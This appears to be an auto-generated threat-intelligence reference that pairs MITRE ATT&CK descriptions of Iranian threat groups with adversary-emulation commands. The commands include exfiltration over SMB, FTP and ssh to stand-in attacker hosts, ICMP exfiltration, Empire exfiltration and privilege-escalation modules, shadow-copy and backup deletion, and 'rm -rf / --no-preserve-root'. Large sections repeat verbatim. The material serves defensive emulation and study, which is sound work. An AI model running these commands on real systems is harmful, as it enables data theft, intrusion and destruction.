[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Email Collection

## Technique Description

```
Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific key words.(Citation: Black Hills MailSniper, 2017)

### Email Forwarding Rule

Adversaries may also abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: TIMMCMIC, 2014)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. 
```

## Technique Commands

```
powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1 -file $home\desktop\mail.csv
powershell/management/mailraider/disable_security
powershell/management/mailraider/disable_security
powershell/management/mailraider/get_emailitems
powershell/management/mailraider/get_emailitems
powershell/management/mailraider/get_subfolders
powershell/management/mailraider/get_subfolders
powershell/management/mailraider/mail_search
powershell/management/mailraider/mail_search
powershell/management/mailraider/search_gal
powershell/management/mailraider/search_gal
powershell/management/mailraider/send_mail
powershell/management/mailraider/send_mail
powershell/management/mailraider/view_email
powershell/management/mailraider/view_email
python/collection/osx/search_email
python/collection/osx/search_email
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Execution Guardrails

## Technique Description

```
Execution guardrails constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. 

Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.

Environmental keying is one type of guardrail that includes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use guardrails and environmental keying to help protect their TTPs and evade detection. For example, environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to further engage because the value conditions specified by the adversary are meant to be target specific and not such that they could occur in any environment.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Exfiltration Over Alternative Protocol

## Technique Description

```
Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.

Adversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. 

SMB command-line example:

* <code>net use \\\attacker_system\IPC$ /user:username password && xcopy /S /H /C /Y C:\Users\\* \\\attacker_system\share_folder\</code>

Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)

* <code>echo PUT C:\Path\to\file.txt | ftp -A attacker_system</code>

```

## Technique Commands

```
ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
powershell/exfiltration/exfil_dropbox
powershell/exfiltration/exfil_dropbox
exfiltration/Invoke_ExfilDataToGitHub
exfiltration/Invoke_ExfilDataToGitHub
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Exfiltration Over Alternative Protocol

## Technique Description

```
Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.

Adversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. 

SMB command-line example:

* <code>net use \\\attacker_system\IPC$ /user:username password && xcopy /S /H /C /Y C:\Users\\* \\\attacker_system\share_folder\</code>

Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)

* <code>echo PUT C:\Path\to\file.txt | ftp -A attacker_system</code>

```

## Technique Commands

```
ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
powershell/exfiltration/exfil_dropbox
powershell/exfiltration/exfil_dropbox
exfiltration/Invoke_ExfilDataToGitHub
exfiltration/Invoke_ExfilDataToGitHub
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Exploitation for Client Execution

## Technique Description

```
Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), [Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.
```

## Technique Commands

```
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Exploitation for Privilege Escalation

## Technique Description

```
Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform Privilege Escalation to include use of software exploitation to circumvent those restrictions.

When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.
```

## Technique Commands

```
getsystem
getsystem
bitsadmin.exe
msbuild.exe *MSBuildShell.csproj
powershell/privesc/ms16-032
powershell/privesc/ms16-032
powershell/privesc/tater
powershell/privesc/tater
powershell/privesc/ms16-135
powershell/privesc/ms16-135
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: External Remote Services

## Technique Description

```
Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028) can also be used externally.

Adversaries may use remote services to initially access and/or persist within a network. (Citation: Volexity Virtual Private Keylogging) Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of [Redundant Access](https://attack.mitre.org/techniques/T1108) during an operation.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Fallback Channels

## Technique Description

```
Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.
```

## Technique Commands

```
powershell/management/switch_listener
powershell/management/switch_listener
external/generate_agent
external/generate_agent
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: File Deletion

## Technique Description

```
Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)
```

## Technique Commands

```
rm -f /tmp/victim-files/a
rm -rf /tmp/victim-files
shred -u /tmp/victim-shred.txt
echo "T1107" > %temp%\T1107.txt
del /f  %temp%\T1107.txt
mkdir %temp%\T1107
rmdir /s /q %temp%\T1107
New-Item $env:TEMP\T1107.txt
Remove-Item -path $env:TEMP\T1107.txt
New-Item $env:TEMP\T1107 -ItemType Directory
Remove-Item -path $env:TEMP\T1107 -recurse
vssadmin.exe Delete Shadows /All /Quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
rm -rf / --no-preserve-root > /dev/null 2> /dev/null
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
```



# Actor: Group5

## Actor Description

```
[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)
```

## Actor Aliases

```
Group5
```

## Technique Name: File Deletion

## Technique Description

```
Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)
```

## Technique Commands

```
rm -f /tmp/victim-files/a
rm -rf /tmp/victim-files
shred -u /tmp/victim-shred.txt
echo "T1107" > %temp%\T1107.txt
del /f  %temp%\T1107.txt
mkdir %temp%\T1107
rmdir /s /q %temp%\T1107
New-Item $env:TEMP\T1107.txt
Remove-Item -path $env:TEMP\T1107.txt
New-Item $env:TEMP\T1107 -ItemType Directory
Remove-Item -path $env:TEMP\T1107 -recurse
vssadmin.exe Delete Shadows /All /Quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
rm -rf / --no-preserve-root > /dev/null 2> /dev/null
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: File Deletion

## Technique Description

```
Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)
```

## Technique Commands

```
rm -f /tmp/victim-files/a
rm -rf /tmp/victim-files
shred -u /tmp/victim-shred.txt
echo "T1107" > %temp%\T1107.txt
del /f  %temp%\T1107.txt
mkdir %temp%\T1107
rmdir /s /q %temp%\T1107
New-Item $env:TEMP\T1107.txt
Remove-Item -path $env:TEMP\T1107.txt
New-Item $env:TEMP\T1107 -ItemType Directory
Remove-Item -path $env:TEMP\T1107 -recurse
vssadmin.exe Delete Shadows /All /Quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
rm -rf / --no-preserve-root > /dev/null 2> /dev/null
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: File and Directory Discovery

## Technique Description

```
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.

### Mac and Linux

In Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.
```

## Technique Commands

```
dir /s c:\ >> %temp%\download
dir /s "c:\Documents and Settings" >> %temp%\download
dir /s "c:\Program Files\" >> %temp%\download
dir /s d:\ >> %temp%\download
dir "%systemdrive%\Users\*.*" >> %temp%\download
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
dir "%userprofile%\Desktop\*.*" >> %temp%\download
tree /F >> %temp%\download
ls -recurse
get-childitem -recurse
gci -recurse
ls -a > allcontents.txt
ls -la /Library/Preferences/ > detailedprefsinfo.txt
file */* *>> ../files.txt
find . -type f
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt
cat /etc/mtab > /tmp/loot.txt
find . -type f -iname *.pdf > /tmp/loot.txt
find . -type f -name ".*"
powershell/collection/file_finder
powershell/collection/file_finder
powershell/collection/find_interesting_file
powershell/collection/find_interesting_file
powershell/collection/get_indexed_item
powershell/collection/get_indexed_item
powershell/situational_awareness/network/powerview/get_fileserver
powershell/situational_awareness/network/powerview/get_fileserver
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: File and Directory Discovery

## Technique Description

```
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.

### Mac and Linux

In Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.
```

## Technique Commands

```
dir /s c:\ >> %temp%\download
dir /s "c:\Documents and Settings" >> %temp%\download
dir /s "c:\Program Files\" >> %temp%\download
dir /s d:\ >> %temp%\download
dir "%systemdrive%\Users\*.*" >> %temp%\download
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
dir "%userprofile%\Desktop\*.*" >> %temp%\download
tree /F >> %temp%\download
ls -recurse
get-childitem -recurse
gci -recurse
ls -a > allcontents.txt
ls -la /Library/Preferences/ > detailedprefsinfo.txt
file */* *>> ../files.txt
find . -type f
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt
cat /etc/mtab > /tmp/loot.txt
find . -type f -iname *.pdf > /tmp/loot.txt
find . -type f -name ".*"
powershell/collection/file_finder
powershell/collection/file_finder
powershell/collection/find_interesting_file
powershell/collection/find_interesting_file
powershell/collection/get_indexed_item
powershell/collection/get_indexed_item
powershell/situational_awareness/network/powerview/get_fileserver
powershell/situational_awareness/network/powerview/get_fileserver
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: File and Directory Discovery

## Technique Description

```
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.

### Mac and Linux

In Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.
```

## Technique Commands

```
dir /s c:\ >> %temp%\download
dir /s "c:\Documents and Settings" >> %temp%\download
dir /s "c:\Program Files\" >> %temp%\download
dir /s d:\ >> %temp%\download
dir "%systemdrive%\Users\*.*" >> %temp%\download
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
dir "%userprofile%\Desktop\*.*" >> %temp%\download
tree /F >> %temp%\download
ls -recurse
get-childitem -recurse
gci -recurse
ls -a > allcontents.txt
ls -la /Library/Preferences/ > detailedprefsinfo.txt
file */* *>> ../files.txt
find . -type f
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt
cat /etc/mtab > /tmp/loot.txt
find . -type f -iname *.pdf > /tmp/loot.txt
find . -type f -name ".*"
powershell/collection/file_finder
powershell/collection/file_finder
powershell/collection/find_interesting_file
powershell/collection/find_interesting_file
powershell/collection/get_indexed_item
powershell/collection/get_indexed_item
powershell/situational_awareness/network/powerview/get_fileserver
powershell/situational_awareness/network/powerview/get_fileserver
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Hidden Window

## Technique Description

```
Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.

### Windows
There are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)

### Mac
The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)

```

## Technique Commands

```
Start-Process #{powershell_command}
Start-Process powershell.exe -WindowStyle hidden calc.exe
```



# Actor: CopyKittens

## Actor Description

```
[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)
```

## Actor Aliases

```
